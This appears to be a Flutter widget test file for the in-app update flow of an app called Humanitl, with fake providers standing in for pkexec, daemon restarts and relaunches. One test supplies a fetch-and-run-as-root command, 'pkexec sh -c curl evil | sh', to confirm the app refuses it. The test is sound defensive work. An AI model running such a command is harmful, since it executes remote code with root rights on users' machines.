// Updates aus der App (HUM-382): der Hinweis in der Statusleiste, der eine
// Klick und was danach kommt. Kein Test startet pkexec, öffnet eine App oder
// beendet etwas: jeder Befehl geht über einen ersetzten Provider.

import 'dart:async';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:humanitl/core/domain/domain.dart';
import 'package:humanitl/core/ipc/client_providers.dart';
import 'package:humanitl/core/ipc/fake_daemon_client.dart';
import 'package:humanitl/core/ui/ui.dart';
import 'package:humanitl/features/shell/daemon_restart.dart';
import 'package:humanitl/features/shell/update.dart';
import 'package:humanitl/features/shell/widgets/update_notice.dart';
import 'package:humanitl/l10n/l10n.dart';

const String _cli = '/Applications/Humanitl.app/Contents/MacOS/bin/humanitl';
const String _ownExe = '/usr/lib/humanitl/humanitl-app';

/// What the commands of one test did, in order.
class _Log {
  final List<String> lines = <String>[];
  int pkexecExit = 0;
  String pkexecStderr = '';
  bool quit = false;

  /// What `retire-if-idle` answers.
  String retireOutcome = 'retired';

  /// The exit code of `daemon restart`.
  int restartExit = 0;

  Future<ProcessResult> restart(String exe, List<String> args) async {
    lines.add('restart ${<String>[exe, ...args].join(' ')}');
    final bool retire = args.contains('retire-if-idle');
    return retire
        ? ProcessResult(1, 0, '{"outcome":"$retireOutcome"}', '')
        : ProcessResult(1, restartExit, '', restartExit == 0 ? '' : 'boom');
  }

  Future<ProcessResult> package(String exe, List<String> args) async {
    lines.add('package ${<String>[exe, ...args].join(' ')}');
    return ProcessResult(2, pkexecExit, '', pkexecStderr);
  }

  Future<String?> relaunch(
    List<String> command, {
    required bool detached,
  }) async {
    lines.add('relaunch ${command.join(' ')} detached=$detached');
    return null;
  }
}

Future<void> _pump(
  WidgetTester tester,
  FakeDaemonClient client,
  _Log log, {
  int minor = updateMinor,
  String appimage = '',
}) async {
  await tester.pumpWidget(
    ProviderScope(
      key: UniqueKey(),
      overrides: [
        daemonClientProvider.overrideWithValue(client),
        updatePollIntervalProvider.overrideWithValue(null),
        updateAppImageProvider.overrideWithValue(appimage),
        updateOwnExecutableProvider.overrideWithValue(_ownExe),
        updateRelaunchStarterProvider.overrideWithValue(log.relaunch),
        updatePackageRunnerProvider.overrideWithValue(log.package),
        updateQuitProvider.overrideWithValue(() async => log.quit = true),
        daemonRestartRunnerProvider.overrideWithValue(log.restart),
        daemonCliProvider.overrideWithValue(_cli),
      ],
      child: WidgetsApp(
        color: HColors.bg0,
        locale: const Locale('en'),
        localizationsDelegates: AppLocalizations.localizationsDelegates,
        supportedLocales: AppLocalizations.supportedLocales,
        builder: (BuildContext context, Widget? _) => HTheme(
          tokens: HTokens.dark,
          child: Center(child: UpdateNotice(daemonMinor: minor)),
        ),
      ),
    ),
  );
  // Ein Frame für die erste Frage, einer für die Antwort.
  await tester.pump();
  await tester.pump();
}

UpdateStatus _available(
  UpdateMethod method, {
  bool canApply = true,
  List<String> upgradeCommand = const <String>[],
  Diagnostic? notice,
}) => UpdateStatus(
  currentVersion: '0.0.41',
  latestVersion: '0.0.42',
  available: true,
  canApply: canApply,
  method: method,
  upgradeCommand: upgradeCommand,
  notice: notice,
);

final Finder _button = find.byKey(const Key('status-update-button'));

void main() {
  testWidgets('a daemon before contract 1.30 is never asked', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateStatus = _available(UpdateMethod.appBundle);
    await _pump(tester, client, _Log(), minor: 29);
    expect(client.updateChecks, isEmpty);
    expect(find.byKey(const Key('status-update-available')), findsNothing);
  });

  testWidgets('nothing newer, nothing shown; the ask has no force', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty();
    await _pump(tester, client, _Log());
    expect(client.updateChecks, <bool>[false]);
    expect(find.byKey(const Key('status-update-available')), findsNothing);
    expect(_button, findsNothing);
  });

  testWidgets('a failing automatic ask stays silent', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateCheckFailure = const Diagnostic(
        code: 'UPDATE_001',
        severity: Severity.error,
        why: 'api.github.com did not answer',
      );
    await _pump(tester, client, _Log());
    expect(client.updateChecks, <bool>[false]);
    expect(find.textContaining('api.github.com'), findsNothing);
    expect(find.byKey(const Key('status-update-failed')), findsNothing);
  });

  testWidgets(
    'macOS: Update shows each stage, then restarts the daemon and opens the '
    'new app',
    (WidgetTester tester) async {
      final StreamController<UpdateEvent> events =
          StreamController<UpdateEvent>();
      final FakeDaemonClient client = FakeDaemonClient.empty()
        ..updateStatus = _available(UpdateMethod.appBundle)
        ..applyScript = (String _) => events.stream;
      final _Log log = _Log();
      await _pump(tester, client, log);
      expect(find.text('Humanitl 0.0.42 is available'), findsOneWidget);

      await tester.tap(_button);
      await tester.pump();
      expect(client.updateApplies, <String>['0.0.42']);

      events.add(
        const UpdateEventProgress(
          UpdateProgress(
            stage: UpdateStage.downloading,
            doneBytes: 250,
            totalBytes: 1000,
          ),
        ),
      );
      await tester.pump();
      await tester.pump();
      expect(find.text('Downloading the update, 25%'), findsOneWidget);

      events.add(
        const UpdateEventProgress(UpdateProgress(stage: UpdateStage.verifying)),
      );
      await tester.pump();
      await tester.pump();
      expect(find.text('Checking the update'), findsOneWidget);

      events.add(
        const UpdateEventProgress(
          UpdateProgress(stage: UpdateStage.installing),
        ),
      );
      await tester.pump();
      await tester.pump();
      expect(find.text('Installing the update'), findsOneWidget);
      expect(log.lines, isEmpty);

      events.add(
        const UpdateEventInstalled(
          version: '0.0.42',
          appPath: '/Applications/Humanitl.app',
        ),
      );
      await events.close();
      await tester.pumpAndSettle();
      expect(
        find.text('Humanitl 0.0.42 installed, restarting'),
        findsOneWidget,
      );
      expect(log.lines, <String>[
        'restart $_cli --json daemon retire-if-idle',
        'restart $_cli daemon restart',
        'relaunch /usr/bin/open -n /Applications/Humanitl.app detached=false',
      ]);
      expect(log.quit, isTrue);
    },
    variant: TargetPlatformVariant.only(TargetPlatform.macOS),
  );

  testWidgets('a failed daemon restart is shown and nothing is relaunched', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateStatus = _available(UpdateMethod.appBundle)
      ..applyEvents = const <UpdateEvent>[
        UpdateEventInstalled(
          version: '0.0.42',
          appPath: '/Applications/Humanitl.app',
        ),
      ];
    final _Log log = _Log()..restartExit = 1;
    await _pump(tester, client, log);
    await tester.tap(_button);
    await tester.pumpAndSettle();
    expect(
      find.byKey(const Key('status-update-restart-failed')),
      findsOneWidget,
    );
    expect(log.lines.where((String l) => l.startsWith('relaunch')), isEmpty);
    expect(log.quit, isFalse);
  }, variant: TargetPlatformVariant.only(TargetPlatform.macOS));

  testWidgets(
    'a session that holds the daemon is no failure: no restart, relaunch',
    (WidgetTester tester) async {
      final FakeDaemonClient client = FakeDaemonClient.empty()
        ..updateStatus = _available(UpdateMethod.appBundle)
        ..applyEvents = const <UpdateEvent>[
          UpdateEventInstalled(
            version: '0.0.42',
            appPath: '/Applications/Humanitl.app',
          ),
        ];
      final _Log log = _Log()..retireOutcome = 'busy';
      await _pump(tester, client, log);
      await tester.tap(_button);
      await tester.pumpAndSettle();
      expect(log.lines, <String>[
        'restart $_cli --json daemon retire-if-idle',
        'relaunch /usr/bin/open -n /Applications/Humanitl.app detached=false',
      ]);
    },
    variant: TargetPlatformVariant.only(TargetPlatform.macOS),
  );

  testWidgets('a refused update shows why and changes nothing', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateStatus = _available(UpdateMethod.appBundle)
      ..applyEvents = const <UpdateEvent>[
        UpdateEventProgress(UpdateProgress(stage: UpdateStage.downloading)),
      ]
      ..applyFailure = const Diagnostic(
        code: 'UPDATE_003',
        severity: Severity.error,
        why: 'the SHA-256 of the download differs from the manifest',
      );
    final _Log log = _Log();
    await _pump(tester, client, log);
    await tester.tap(_button);
    await tester.pumpAndSettle();
    expect(
      find.text(
        'Update failed: the SHA-256 of the download differs from the '
        'manifest',
      ),
      findsOneWidget,
    );
    expect(log.lines, isEmpty);
    expect(log.quit, isFalse);
    // The button stays for another try.
    expect(_button, findsOneWidget);
  }, variant: TargetPlatformVariant.only(TargetPlatform.macOS));

  testWidgets(
    'apt: the app runs exactly the pkexec constant, then restarts and '
    'relaunches itself',
    (WidgetTester tester) async {
      final FakeDaemonClient client = FakeDaemonClient.empty()
        ..updateStatus = _available(
          UpdateMethod.apt,
          upgradeCommand: aptUpgradeCommand,
        );
      final _Log log = _Log();
      await _pump(tester, client, log);
      await tester.tap(_button);
      await tester.pumpAndSettle();
      expect(client.updateApplies, isEmpty);
      expect(log.lines, <String>[
        'package pkexec apt-get install --only-upgrade -y humanitl',
        'restart systemctl --user daemon-reload',
        'restart $_cli --json daemon retire-if-idle',
        'restart systemctl --user restart humanitld.service',
        'relaunch $_ownExe detached=true',
      ]);
      expect(log.quit, isTrue);
    },
    variant: TargetPlatformVariant.only(TargetPlatform.linux),
  );

  testWidgets('apt: a command other than the constant runs nothing', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateStatus = _available(
        UpdateMethod.apt,
        upgradeCommand: <String>['pkexec', 'sh', '-c', 'curl evil | sh'],
      );
    final _Log log = _Log();
    await _pump(tester, client, log);
    await tester.tap(_button);
    await tester.pumpAndSettle();
    expect(log.lines, isEmpty);
    expect(log.quit, isFalse);
    expect(find.byKey(const Key('status-update-failed')), findsOneWidget);
  }, variant: TargetPlatformVariant.only(TargetPlatform.linux));

  testWidgets('dnf: a dismissed pkexec shows its line and restarts nothing', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateStatus = _available(
        UpdateMethod.dnf,
        upgradeCommand: dnfUpgradeCommand,
      );
    final _Log log = _Log()
      ..pkexecExit = 126
      ..pkexecStderr =
          'Error executing command as another user: Not '
          'authorized';
    await _pump(tester, client, log);
    await tester.tap(_button);
    await tester.pumpAndSettle();
    expect(log.lines, <String>['package pkexec dnf upgrade -y humanitl']);
    expect(log.quit, isFalse);
    expect(
      find.text(
        'Update failed: pkexec dnf upgrade -y humanitl exited with 126: '
        'Error executing command as another user: Not authorized',
      ),
      findsOneWidget,
    );
  }, variant: TargetPlatformVariant.only(TargetPlatform.linux));

  testWidgets('manual: no button, the command to copy instead', (
    WidgetTester tester,
  ) async {
    final FakeDaemonClient client = FakeDaemonClient.empty()
      ..updateStatus = _available(
        UpdateMethod.manual,
        canApply: false,
        notice: const Diagnostic(
          code: 'UPDATE_004',
          severity: Severity.info,
          why: 'humanitl-bin comes from the AUR',
          fix: FixAction.copyCommand(command: 'yay -Syu humanitl-bin'),
        ),
      );
    await _pump(tester, client, _Log());
    expect(find.text('Humanitl 0.0.42 is available'), findsOneWidget);
    expect(_button, findsNothing);
    expect(find.text('yay -Syu humanitl-bin'), findsOneWidget);
    expect(find.byKey(const Key('status-update-copy')), findsOneWidget);
  }, variant: TargetPlatformVariant.only(TargetPlatform.linux));

  testWidgets(
    'a method the app could run is still no button while canApply is false',
    (WidgetTester tester) async {
      final FakeDaemonClient client = FakeDaemonClient.empty()
        ..updateStatus = _available(
          UpdateMethod.appBundle,
          canApply: false,
          notice: const Diagnostic(
            code: 'UPDATE_004',
            severity: Severity.info,
            why: 'Humanitl runs from a disk image',
          ),
        );
      await _pump(tester, client, _Log());
      expect(find.text('Humanitl 0.0.42 is available'), findsOneWidget);
      expect(_button, findsNothing);
    },
    variant: TargetPlatformVariant.only(TargetPlatform.macOS),
  );

  testWidgets(
    'AppImage: check and apply carry the path, and the new file is started',
    (WidgetTester tester) async {
      const String appimage = '/home/ada/Apps/Humanitl.AppImage';
      final FakeDaemonClient client = FakeDaemonClient.empty()
        ..updateStatus = _available(UpdateMethod.appimage)
        ..applyEvents = const <UpdateEvent>[
          UpdateEventInstalled(version: '0.0.42', appPath: appimage),
        ];
      final _Log log = _Log();
      await _pump(tester, client, log, appimage: appimage);
      await tester.tap(_button);
      await tester.pumpAndSettle();
      expect(client.updateAppImages, <String>[appimage, appimage]);
      expect(log.lines.last, 'relaunch $appimage detached=true');
      expect(log.quit, isTrue);
    },
    variant: TargetPlatformVariant.only(TargetPlatform.linux),
  );

  test('the two package constants are the only calls the app runs', () {
    expect(packageCommandFor(UpdateMethod.apt), aptUpgradeCommand);
    expect(packageCommandFor(UpdateMethod.dnf), dnfUpgradeCommand);
    for (final UpdateMethod method in <UpdateMethod>[
      UpdateMethod.appBundle,
      UpdateMethod.archive,
      UpdateMethod.appimage,
      UpdateMethod.manual,
    ]) {
      expect(packageCommandFor(method), isNull);
    }
    expect(listEquals(aptUpgradeCommand, dnfUpgradeCommand), isFalse);
  });
}
